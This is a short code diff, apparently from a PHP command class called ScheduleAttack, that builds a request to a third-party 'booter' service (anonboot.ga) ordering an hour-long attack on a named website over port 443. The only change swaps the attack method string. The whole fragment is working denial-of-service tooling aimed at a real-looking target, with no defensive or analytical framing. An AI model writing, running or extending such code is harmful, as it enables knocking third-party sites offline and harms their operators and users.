@@ -41,7 +41,7 @@ class ScheduleAttack extends Command
         $h = 'https://e-viki.com';
         $p = 443;
         $t = 3600;
-        $m = 'Anon-FlCD';
+        $m = 'Anon-Capt';
         $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
         curl_setopt($ch, CURLOPT_HEADER, 0);
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);
